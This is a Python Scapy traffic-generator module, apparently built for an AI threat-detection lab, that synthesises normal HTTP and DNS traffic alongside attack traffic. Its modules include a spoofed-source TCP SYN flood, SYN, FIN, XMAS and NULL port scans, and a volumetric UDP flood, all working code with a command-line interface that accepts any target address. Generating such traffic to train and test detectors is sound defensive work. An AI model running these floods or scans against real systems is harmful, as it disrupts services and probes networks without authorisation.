#!/usr/bin/env python3
"""
====================================================================================================
NTRO AI-Based Cyber Threat Detection System - Phase 2: Traffic & Packet Generator Engine
Module: traffic_generator.py
Role: Advanced Python Network Security Engineer

Description:
    Production-grade, highly configurable Scapy-backed Layer 3/Layer 4 traffic generation engine.
    Capable of synthesizing both legitimate background traffic (HTTP/HTTPS, DNS, realistic TCP/UDP)
    and complex multi-vector cyber attack scenarios including:
      1. High-Rate TCP SYN Flood (with randomized / spoofed source IPs and high ports).
      2. Multi-Port Scan Reconnaissance Simulator (sequential, randomized, or top service ports).
      3. Dense Volumetric UDP Flood (custom payload density, MTU fragmentation control).
      4. Legitimate Multi-Flow Background Stream (with human-like inter-arrival jitter).

Capabilities:
    - High-resolution timing control via time.perf_counter() for exact PPS and IAT regulation.
    - Dataclass configuration schemas for clean, type-safe profile definitions.
    - Full CLI interface via argparse with human-readable telemetry tables and JSON output.
    - Robust exception handling for raw socket permissions (CAP_NET_ADMIN / CAP_NET_RAW).
====================================================================================================
"""

import argparse
import ipaddress
import json
import logging
import os
import random
import socket
import sys
import time
from dataclasses import asdict, dataclass, field
from typing import Any, Callable, Dict, Iterator, List, Optional, Tuple, Union

# Structured Logging Setup
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] [%(name)s] %(message)s",
    datefmt="%Y-%m-%d %H:%M:%S",
)
logger = logging.getLogger("TrafficGenerator")

# Scapy Import with Defensive Exception Handling
try:
    # pyrefly: ignore [missing-import]
    from scapy.all import (
        ICMP,
        IP,
        TCP,
        UDP,
        Raw,
        conf,
        get_if_addr,
        get_if_list,
        send,
    )
    # Silence Scapy default verbosity
    conf.verb = 0
except ImportError:
    logger.critical(
        "Scapy is not installed. Please install dependencies via 'pip install -r requirements.txt'."
    )
    sys.exit(1)


# ==================================================================================================
# 1. Configuration Schemas & Dataclasses
# ==================================================================================================

@dataclass
class BaseTrafficConfig:
    """Base network configuration for packet synthesis."""
    source_ip: str = "192.168.10.10"
    destination_ip: str = "192.168.10.20"
    source_port: int = 54321
    destination_port: int = 80
    packet_count: int = 100
    duration_sec: Optional[float] = None
    rate_pps: Optional[float] = None
    iat_sec: float = 0.01
    packet_size: Optional[int] = None
    payload_data: Optional[Union[str, bytes]] = None
    spoof_source_ip: bool = False
    spoof_subnet: str = "10.0.0.0/16"
    random_source_port: bool = False
    interface: Optional[str] = None
    verbose: bool = False


@dataclass
class NormalTrafficConfig(BaseTrafficConfig):
    """Configuration for legitimate background network streams."""
    protocol: str = "TCP"  # TCP or UDP
    service_type: str = "HTTP"  # HTTP, HTTPS, DNS, API
    jitter_pct: float = 0.20  # Human-like random inter-arrival variation (20%)
    packet_size: int = 384
    iat_sec: float = 0.05


@dataclass
class SynFloodConfig(BaseTrafficConfig):
    """Configuration for high-rate TCP SYN Flood attack vector."""
    destination_port: int = 80
    packet_count: int = 500
    iat_sec: float = 0.001
    rate_pps: Optional[float] = 1000.0
    spoof_source_ip: bool = True
    spoof_subnet: str = "172.16.0.0/16"
    random_source_port: bool = True
    tcp_flags: List[str] = field(default_factory=lambda: ["SYN"])
    window_size: int = 64240


@dataclass
class PortScanConfig(BaseTrafficConfig):
    """Configuration for multi-port reconnaissance probe sweeping."""
    start_port: int = 20
    end_port: int = 100
    custom_ports: Optional[List[int]] = None
    scan_type: str = "SYN"  # SYN, FIN, XMAS, NULL
    randomize_port_order: bool = False
    iat_sec: float = 0.02
    packet_count: int = 80


@dataclass
class UdpFloodConfig(BaseTrafficConfig):
    """Configuration for volumetric dense UDP Flood attack vector."""
    destination_port: int = 9999
    packet_count: int = 300
    packet_size: int = 1024
    iat_sec: float = 0.002
    rate_pps: Optional[float] = 500.0
    random_source_port: bool = True
    payload_pattern: str = "NTRO_CYBER_LAB_VOLUMETRIC_UDP_FLOOD_PAYLOAD_CHUNK_"


@dataclass
class TelemetryReport:
    """Standardized performance and transmission metric report."""
    status: str
    attack_vector: str
    protocol: str
    source_endpoint: str
    destination_endpoint: str
    packets_requested: int
    packets_transmitted: int
    total_bytes_sent: int
    total_duration_sec: float
    actual_packets_per_sec: float
    throughput_kbps: float
    throughput_mbps: float
    errors_encountered: int
    configured_iat_sec: float

    def to_dict(self) -> Dict[str, Any]:
        return asdict(self)


# ==================================================================================================
# 2. Helper Utilities: IP Spoofing, Port Pools, Flag Mapping
# ==================================================================================================

TOP_SERVICES_PORTS = [
    21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 443, 445, 993, 995,
    1433, 1521, 3306, 3389, 5432, 5900, 6379, 8000, 8080, 8443, 9000,
]

TCP_FLAG_MAP: Dict[str, str] = {
    "F": "F", "FIN": "F",
    "S": "S", "SYN": "S",
    "R": "R", "RST": "R",
    "P": "P", "PSH": "P",
    "A": "A", "ACK": "A",
    "U": "U", "URG": "U",
    "E": "E", "ECE": "E",
    "C": "C", "CWR": "C",
}


def generate_random_ip_from_subnet(subnet_cidr: str = "10.0.0.0/16") -> str:
    """Generate a random valid host IPv4 address within a specified CIDR subnet."""
    try:
        network = ipaddress.IPv4Network(subnet_cidr, strict=False)
        # Avoid network and broadcast address
        random_host = random.randint(1, network.num_addresses - 2)
        return str(network.network_address + random_host)
    except Exception:
        # Fallback to fully random private IP
        return f"10.{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}"


def resolve_tcp_flags(flags: List[str]) -> str:
    """Convert human flag names (['SYN', 'ACK']) to Scapy compact flag string ('SA')."""
    scapy_flags = ""
    for f in flags:
        clean = f.strip().upper()
        if clean in TCP_FLAG_MAP:
            char = TCP_FLAG_MAP[clean]
            if char not in scapy_flags:
                scapy_flags += char
    return scapy_flags if scapy_flags else "S"


def calculate_payload_padding(
    base_headers_size: int,
    target_packet_size: Optional[int],
    custom_payload: Optional[Union[str, bytes]] = None,
    default_pattern: bytes = b"NTRO_SECURITY_TELEMETRY",
) -> bytes:
    """Construct byte payload padded to reach target total Layer 3 packet size."""
    if custom_payload is not None:
        if isinstance(custom_payload, str):
            raw_bytes = custom_payload.encode("utf-8")
        else:
            raw_bytes = custom_payload
    else:
        raw_bytes = default_pattern

    if target_packet_size is not None and target_packet_size > base_headers_size:
        needed_padding = target_packet_size - base_headers_size
        if len(raw_bytes) < needed_padding:
            raw_bytes = raw_bytes + (b"\x00" * (needed_padding - len(raw_bytes)))
        elif len(raw_bytes) > needed_padding:
            raw_bytes = raw_bytes[:needed_padding]

    return raw_bytes


# ==================================================================================================
# 3. Main Traffic Generator Engine Class
# ==================================================================================================

class TrafficGenerator:
    """
    Advanced Scapy-backed packet generation and performance metering engine.
    Supports continuous timing loops, high-rate bursts, and multi-vector attack scenarios.
    """

    def __init__(self, interface: Optional[str] = None):
        self.interface = interface
        self._validate_environment()

    def _validate_environment(self) -> None:
        """Validate raw socket capabilities and operating privileges."""
        try:
            raw_sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
            raw_sock.close()
            logger.debug("Raw socket capabilities verified (CAP_NET_ADMIN / Root confirmed).")
        except PermissionError:
            logger.warning(
                "Raw socket creation permission denied! If running inside Docker, ensure 'cap_add: [NET_ADMIN, NET_RAW]' is enabled."
            )
        except Exception as exc:
            logger.warning("Environment socket check warning: %s", exc)

    def _execute_transmission_loop(
        self,
        packet_factory: Callable[[int], Any],
        total_packets: int,
        target_iat: float,
        duration_sec: Optional[float] = None,
        vector_name: str = "Generic",
        source_desc: str = "192.168.10.10",
        dest_desc: str = "192.168.10.20",
        protocol: str = "TCP",
    ) -> TelemetryReport:
        """
        High-precision transmission engine utilizing time.perf_counter() for clock accuracy.
        Supports both fixed packet counts and duration-bounded generation.
        """
        packets_transmitted = 0
        total_bytes_sent = 0
        errors_encountered = 0

        logger.info(
            "[*] Initiating [%s] | Target: %s -> %s | Plan: %s pkts | IAT: %.5fs",
            vector_name,
            source_desc,
            dest_desc,
            f"{total_packets}" if not duration_sec else f"Duration {duration_sec}s",
            target_iat,
        )

        start_time = time.perf_counter()
        next_packet_time = start_time

        try:
            while True:
                # 1. Check termination conditions
                curr_time = time.perf_counter()
                if duration_sec and (curr_time - start_time) >= duration_sec:
                    break
                if not duration_sec and packets_transmitted >= total_packets:
                    break

                # 2. Build Packet via Factory Callback
                try:
                    pkt = packet_factory(packets_transmitted)
                    pkt_len = len(pkt)
                    
                    # 3. Transmit via Scapy
                    send(pkt, count=1, verbose=False, iface=self.interface)
                    packets_transmitted += 1
                    total_bytes_sent += pkt_len
                except Exception as send_err:
                    errors_encountered += 1
                    if errors_encountered <= 5:
                        logger.error("Transmission error at pkt #%d: %s", packets_transmitted + 1, send_err)
                    elif errors_encountered == 6:
                        logger.error("Suppressing further transmission error logs...")

                # 4. High-Precision Inter-Arrival Timing Regulation
                if target_iat > 0:
                    next_packet_time += target_iat
                    sleep_duration = next_packet_time - time.perf_counter()
                    if sleep_duration > 0.0005:
                        time.sleep(sleep_duration)
                    else:
                        # Yield execution without overhead
                        time.sleep(0)

        except KeyboardInterrupt:
            logger.warning("[!] Interrupted by user after %d packets.", packets_transmitted)

        end_time = time.perf_counter()
        total_duration = max(end_time - start_time, 0.0001)

        actual_pps = packets_transmitted / total_duration
        throughput_kbps = (total_bytes_sent * 8.0) / (total_duration * 1000.0)
        throughput_mbps = throughput_kbps / 1000.0

        report = TelemetryReport(
            status="COMPLETED" if errors_encountered == 0 else "COMPLETED_WITH_ERRORS",
            attack_vector=vector_name,
            protocol=protocol,
            source_endpoint=source_desc,
            destination_endpoint=dest_desc,
            packets_requested=total_packets if not duration_sec else int(total_duration / max(target_iat, 0.0001)),
            packets_transmitted=packets_transmitted,
            total_bytes_sent=total_bytes_sent,
            total_duration_sec=round(total_duration, 4),
            actual_packets_per_sec=round(actual_pps, 2),
            throughput_kbps=round(throughput_kbps, 2),
            throughput_mbps=round(throughput_mbps, 4),
            errors_encountered=errors_encountered,
            configured_iat_sec=target_iat,
        )

        logger.info(
            "[✓] [%s] Complete: %d pkts (%d bytes) in %.3fs | PPS: %.1f | Rate: %.2f Kbps",
            vector_name,
            packets_transmitted,
            total_bytes_sent,
            total_duration,
            actual_pps,
            throughput_kbps,
        )
        return report

    # ----------------------------------------------------------------------------------------------
    # MODULE 1: Normal Traffic Stream Generator
    # ----------------------------------------------------------------------------------------------
    def generate_normal_stream(self, config: NormalTrafficConfig) -> TelemetryReport:
        """
        Generate realistic legitimate traffic stream (HTTP/HTTPS, API requests, DNS, TCP handshakes)
        with stochastic human-like inter-arrival jitter.
        """
        # Predefined HTTP GET payload template
        http_payload = (
            f"GET /api/v1/telemetry/nodes HTTP/1.1\r\n"
            f"Host: {config.destination_ip}\r\n"
            f"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) NTRO-Client/2.4\r\n"
            f"Accept: application/json\r\n"
            f"Connection: keep-alive\r\n\r\n"
        ).encode("utf-8")

        dns_payload = b"\xaa\xbb\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03api\x04ntro\x03gov\x00\x00\x01\x00\x01"

        def packet_builder(seq_idx: int):
            # Dynamic source port emulation for distinct client sessions
            src_port = config.source_port + (seq_idx % 10)
            src_ip = config.source_ip

            # Apply temporal jitter to IAT
            jitter_factor = random.uniform(1.0 - config.jitter_pct, 1.0 + config.jitter_pct)
            current_iat = max(0.001, config.iat_sec * jitter_factor)

            if config.protocol.upper() == "TCP":
                flags = "PA" if (seq_idx % 3 == 0) else "A"
                payload = calculate_payload_padding(
                    base_headers_size=40,
                    target_packet_size=config.packet_size,
                    custom_payload=http_payload,
                )
                pkt = (
                    IP(src=src_ip, dst=config.destination_ip)
                    / TCP(sport=src_port, dport=config.destination_port, flags=flags, seq=1000 + seq_idx * 100)
                    / Raw(load=payload)
                )
            elif config.protocol.upper() == "UDP":
                payload = calculate_payload_padding(
                    base_headers_size=28,
                    target_packet_size=config.packet_size,
                    custom_payload=dns_payload,
                )
                pkt = (
                    IP(src=src_ip, dst=config.destination_ip)
                    / UDP(sport=src_port, dport=config.destination_port)
                    / Raw(load=payload)
                )
            else:
                pkt = IP(src=src_ip, dst=config.destination_ip) / ICMP(type=8, code=0) / Raw(load=b"NORMAL_PING")

            return pkt

        return self._execute_transmission_loop(
            packet_factory=packet_builder,
            total_packets=config.packet_count,
            target_iat=config.iat_sec,
            duration_sec=config.duration_sec,
            vector_name="Normal_Traffic",
            source_desc=f"{config.source_ip}:{config.source_port}",
            dest_desc=f"{config.destination_ip}:{config.destination_port}",
            protocol=config.protocol.upper(),
        )

    # ----------------------------------------------------------------------------------------------
    # MODULE 2: High-Rate TCP SYN Flood Generator
    # ----------------------------------------------------------------------------------------------
    def generate_syn_flood(self, config: SynFloodConfig) -> TelemetryReport:
        """
        Generate high-frequency TCP SYN packet flood with randomized source IPs and high ephemeral ports.
        Simulates asymmetric resource exhaustion on target TCP state tables.
        """
        target_iat = config.iat_sec
        if config.rate_pps and config.rate_pps > 0:
            target_iat = 1.0 / config.rate_pps

        def packet_builder(seq_idx: int):
            # Source IP: Spoofed random IP or static
            if config.spoof_source_ip:
                src_ip = generate_random_ip_from_subnet(config.spoof_subnet)
            else:
                src_ip = config.source_ip

            # Source Port: Random ephemeral or configured
            src_port = random.randint(1024, 65535) if config.random_source_port else (config.source_port + seq_idx) % 65535

            # TCP Options typical of SYN handshakes (MSS, SACK, Window Scale)
            tcp_options = [('MSS', 1460), ('SAckOK', b''), ('WScale', 7)]
            flags_str = resolve_tcp_flags(config.tcp_flags)

            pkt = (
                IP(src=src_ip, dst=config.destination_ip)
                / TCP(
                    sport=src_port,
                    dport=config.destination_port,
                    flags=flags_str,
                    seq=random.randint(100000, 4000000000),
                    window=config.window_size,
                    options=tcp_options,
                )
            )
            return pkt

        return self._execute_transmission_loop(
            packet_factory=packet_builder,
            total_packets=config.packet_count,
            target_iat=target_iat,
            duration_sec=config.duration_sec,
            vector_name="SYN_Flood",
            source_desc=f"SPOOFED({config.spoof_subnet})" if config.spoof_source_ip else config.source_ip,
            dest_desc=f"{config.destination_ip}:{config.destination_port}",
            protocol="TCP",
        )

    # ----------------------------------------------------------------------------------------------
    # MODULE 3: Multi-Port Scan Reconnaissance Simulator
    # ----------------------------------------------------------------------------------------------
    def generate_port_scan(self, config: PortScanConfig) -> TelemetryReport:
        """
        Simulate multi-port reconnaissance probe scanning (sequential, randomized, or top service ports)
        using TCP SYN stealth, FIN, Xmas, or NULL probes.
        """
        # Determine port sequence
        if config.custom_ports:
            port_list = list(config.custom_ports)
        elif config.start_port and config.end_port:
            port_list = list(range(config.start_port, config.end_port + 1))
        else:
            port_list = list(TOP_SERVICES_PORTS)

        if config.randomize_port_order:
            random.shuffle(port_list)

        total_ports = len(port_list)
        packet_count = total_ports if not config.packet_count else min(config.packet_count, total_ports)

        # Resolve scan flags
        if config.scan_type.upper() == "SYN":
            flags = "S"
        elif config.scan_type.upper() == "FIN":
            flags = "F"
        elif config.scan_type.upper() == "XMAS":
            flags = "FPU"  # FIN + PSH + URG
        elif config.scan_type.upper() == "NULL":
            flags = ""  # No flags
        else:
            flags = "S"

        def packet_builder(seq_idx: int):
            dst_port = port_list[seq_idx % total_ports]
            src_port = config.source_port + (seq_idx % 500)
            src_ip = config.source_ip

            pkt = (
                IP(src=src_ip, dst=config.destination_ip)
                / TCP(sport=src_port, dport=dst_port, flags=flags, seq=random.randint(1000, 999999))
            )
            return pkt

        return self._execute_transmission_loop(
            packet_factory=packet_builder,
            total_packets=packet_count,
            target_iat=config.iat_sec,
            duration_sec=config.duration_sec,
            vector_name=f"Port_Scan_{config.scan_type.upper()}",
            source_desc=f"{config.source_ip}:{config.source_port}",
            dest_desc=f"{config.destination_ip}:[{port_list[0]}..{port_list[-1]}] ({total_ports} ports)",
            protocol="TCP",
        )

    # ----------------------------------------------------------------------------------------------
    # MODULE 4: Dense Volumetric UDP Flood Generator
    # ----------------------------------------------------------------------------------------------
    def generate_udp_flood(self, config: UdpFloodConfig) -> TelemetryReport:
        """
        Generate dense volumetric UDP datagram flood with customizable byte payloads and high PPS.
        Evaluates bandwidth exhaustion and high-throughput socket processing limits.
        """
        target_iat = config.iat_sec
        if config.rate_pps and config.rate_pps > 0:
            target_iat = 1.0 / config.rate_pps

        # Precompute payload bytes chunk
        base_payload = config.payload_pattern.encode("utf-8")

        def packet_builder(seq_idx: int):
            if config.spoof_source_ip:
                src_ip = generate_random_ip_from_subnet(config.spoof_subnet)
            else:
                src_ip = config.source_ip

            src_port = random.randint(1024, 65535) if config.random_source_port else config.source_port

            payload = calculate_payload_padding(
                base_headers_size=28,  # IP(20) + UDP(8)
                target_packet_size=config.packet_size,
                custom_payload=base_payload,
            )

            pkt = (
                IP(src=src_ip, dst=config.destination_ip)
                / UDP(sport=src_port, dport=config.destination_port)
                / Raw(load=payload)
            )
            return pkt

        return self._execute_transmission_loop(
            packet_factory=packet_builder,
            total_packets=config.packet_count,
            target_iat=target_iat,
            duration_sec=config.duration_sec,
            vector_name="UDP_Flood",
            source_desc=f"SPOOFED({config.spoof_subnet})" if config.spoof_source_ip else config.source_ip,
            dest_desc=f"{config.destination_ip}:{config.destination_port}",
            protocol="UDP",
        )


# ==================================================================================================
# 4. Presentation & CLI Formatting Helpers
# ==================================================================================================

def format_telemetry_table(report: TelemetryReport) -> str:
    """Format structured telemetry metrics into an aligned visual audit report."""
    border = "=" * 75
    sub_border = "-" * 75
    lines = [
        "",
        border,
        f" NTRO TELEMETRY GENERATION REPORT - {report.attack_vector.upper()}",
        border,
        f"  Execution Status        : {report.status}",
        f"  Protocol Vector         : {report.protocol}",
        f"  Source Endpoint         : {report.source_endpoint}",
        f"  Destination Endpoint    : {report.destination_endpoint}",
        sub_border,
        f"  Packets Transmitted     : {report.packets_transmitted:,} / {report.packets_requested:,}",
        f"  Total Data Sent         : {report.total_bytes_sent:,} Bytes ({round(report.total_bytes_sent / 1024.0, 2):,} KB)",
        f"  Execution Duration      : {report.total_duration_sec:.4f} seconds",
        f"  Actual Packet Velocity  : {report.actual_packets_per_sec:,.2f} PPS (Packets/Sec)",
        f"  Bandwidth Throughput    : {report.throughput_kbps:,.2f} Kbps ({report.throughput_mbps:,.4f} Mbps)",
        f"  Inter-Arrival Timing    : {report.configured_iat_sec:.5f} sec (Configured)",
        f"  Transmission Errors     : {report.errors_encountered}",
        border,
    ]
    return "\n".join(lines)


# ==================================================================================================
# 5. Command-Line Interface (CLI) Entrypoint
# ==================================================================================================

def build_argument_parser() -> argparse.ArgumentParser:
    """Construct comprehensive argument parser for CLI execution."""
    parser = argparse.ArgumentParser(
        description="NTRO AI Threat Detection Lab - Phase 2: Traffic & Packet Generation Engine",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Usage Examples:
  1. Generate Normal HTTP Web Traffic:
     python traffic_generator.py --mode normal --dst 192.168.10.20 --count 100 --iat 0.05

  2. High-Rate Spoofed SYN Flood Attack:
     python traffic_generator.py --mode syn-flood --dst 192.168.10.20 --dst-port 80 --count 1000 --rate 1500 --spoof

  3. Multi-Port Sequential Scan Reconnaissance:
     python traffic_generator.py --mode port-scan --dst 192.168.10.20 --port-range 20-100 --scan-type SYN

  4. Dense Volumetric UDP Flood:
     python traffic_generator.py --mode udp-flood --dst 192.168.10.20 --dst-port 9999 --size 1200 --count 500 --rate 500

  5. Execute All Traffic Profiles Sequentially:
     python traffic_generator.py --mode all --dst 192.168.10.20
        """,
    )

    parser.add_argument(
        "--mode",
        "-m",
        type=str,
        choices=["normal", "syn-flood", "port-scan", "udp-flood", "all"],
        default="normal",
        help="Traffic vector or scenario to execute (default: normal)",
    )
    parser.add_argument(
        "--src",
        type=str,
        default="192.168.10.10",
        help="Source IPv4 address (default: 192.168.10.10)",
    )
    parser.add_argument(
        "--dst",
        type=str,
        default="192.168.10.20",
        help="Destination IPv4 address (default: 192.168.10.20)",
    )
    parser.add_argument(
        "--src-port",
        type=int,
        default=54321,
        help="Source port (default: 54321)",
    )
    parser.add_argument(
        "--dst-port",
        type=int,
        default=80,
        help="Destination target port (default: 80)",
    )
    parser.add_argument(
        "--count",
        "-c",
        type=int,
        default=None,
        help="Total packet count to transmit (overrides profile default)",
    )
    parser.add_argument(
        "--duration",
        "-d",
        type=float,
        default=None,
        help="Execution duration in seconds (runs until time expires)",
    )
    parser.add_argument(
        "--rate",
        "-r",
        type=float,
        default=None,
        help="Target transmission rate in packets per second (PPS)",
    )
    parser.add_argument(
        "--iat",
        type=float,
        default=None,
        help="Inter-arrival time between packets in seconds",
    )
    parser.add_argument(
        "--size",
        "-s",
        type=int,
        default=None,
        help="Total packet size in bytes (padded with payload)",
    )
    parser.add_argument(
        "--port-range",
        type=str,
        default="20-100",
        help="Port range for port-scan mode (e.g. '20-100' or 'common')",
    )
    parser.add_argument(
        "--scan-type",
        type=str,
        choices=["SYN", "FIN", "XMAS", "NULL"],
        default="SYN",
        help="Scan probe type for port-scan mode (default: SYN)",
    )
    parser.add_argument(
        "--spoof",
        action="store_true",
        help="Enable source IP address spoofing / randomization",
    )
    parser.add_argument(
        "--spoof-subnet",
        type=str,
        default="172.16.0.0/16",
        help="Subnet CIDR for generating spoofed source IPs (default: 172.16.0.0/16)",
    )
    parser.add_argument(
        "--interface",
        "-i",
        type=str,
        default=None,
        help="Network interface to bind (e.g. eth0)",
    )
    parser.add_argument(
        "--json",
        action="store_true",
        help="Output raw JSON report instead of formatted table",
    )
    parser.add_argument(
        "--verbose",
        "-v",
        action="store_true",
        help="Enable verbose debugging logs",
    )

    return parser


def main() -> None:
    parser = build_argument_parser()
    args = parser.parse_args()

    if args.verbose:
        logger.setLevel(logging.DEBUG)

    generator = TrafficGenerator(interface=args.interface)
    reports: List[TelemetryReport] = []

    modes_to_execute = (
        ["normal", "syn-flood", "port-scan", "udp-flood"]
        if args.mode == "all"
        else [args.mode]
    )

    print("=" * 75)
    print(" NTRO AI CYBER THREAT DETECTION LAB - PHASE 2 TRAFFIC GENERATOR")
    print("=" * 75)

    for current_mode in modes_to_execute:
        logger.info(">>> Launching Vector Mode: [%s] <<<", current_mode)

        if current_mode == "normal":
            cfg = NormalTrafficConfig(
                source_ip=args.src,
                destination_ip=args.dst,
                source_port=args.src_port,
                destination_port=args.dst_port,
                packet_count=args.count if args.count is not None else 100,
                duration_sec=args.duration,
                iat_sec=args.iat if args.iat is not None else 0.03,
                packet_size=args.size if args.size is not None else 384,
            )
            rep = generator.generate_normal_stream(cfg)
            reports.append(rep)

        elif current_mode == "syn-flood":
            cfg = SynFloodConfig(
                source_ip=args.src,
                destination_ip=args.dst,
                destination_port=args.dst_port,
                packet_count=args.count if args.count is not None else 500,
                duration_sec=args.duration,
                rate_pps=args.rate if args.rate is not None else 1000.0,
                iat_sec=args.iat if args.iat is not None else 0.001,
                spoof_source_ip=args.spoof or True,  # Default True for SYN flood attack
                spoof_subnet=args.spoof_subnet,
            )
            rep = generator.generate_syn_flood(cfg)
            reports.append(rep)

        elif current_mode == "port-scan":
            # Parse port range
            start_p, end_p = 20, 100
            custom_p = None
            if args.port_range.lower() == "common":
                custom_p = TOP_SERVICES_PORTS
            elif "-" in args.port_range:
                parts = args.port_range.split("-")
                start_p, end_p = int(parts[0]), int(parts[1])

            cfg = PortScanConfig(
                source_ip=args.src,
                destination_ip=args.dst,
                source_port=args.src_port,
                start_port=start_p,
                end_port=end_p,
                custom_ports=custom_p,
                scan_type=args.scan_type,
                iat_sec=args.iat if args.iat is not None else 0.015,
                packet_count=args.count if args.count is not None else (len(custom_p) if custom_p else end_p - start_p + 1),
            )
            rep = generator.generate_port_scan(cfg)
            reports.append(rep)

        elif current_mode == "udp-flood":
            cfg = UdpFloodConfig(
                source_ip=args.src,
                destination_ip=args.dst,
                destination_port=args.dst_port if args.dst_port != 80 else 9999,
                packet_count=args.count if args.count is not None else 300,
                duration_sec=args.duration,
                packet_size=args.size if args.size is not None else 1024,
                rate_pps=args.rate if args.rate is not None else 500.0,
                iat_sec=args.iat if args.iat is not None else 0.002,
                spoof_source_ip=args.spoof,
                spoof_subnet=args.spoof_subnet,
            )
            rep = generator.generate_udp_flood(cfg)
            reports.append(rep)

        # Brief pause between sequential vectors
        if len(modes_to_execute) > 1 and current_mode != modes_to_execute[-1]:
            time.sleep(1.0)

    # Output Presentation
    if args.json:
        output_data = [r.to_dict() for r in reports]
        print(json.dumps(output_data, indent=2))
    else:
        for r in reports:
            print(format_telemetry_table(r))


if __name__ == "__main__":
    main()
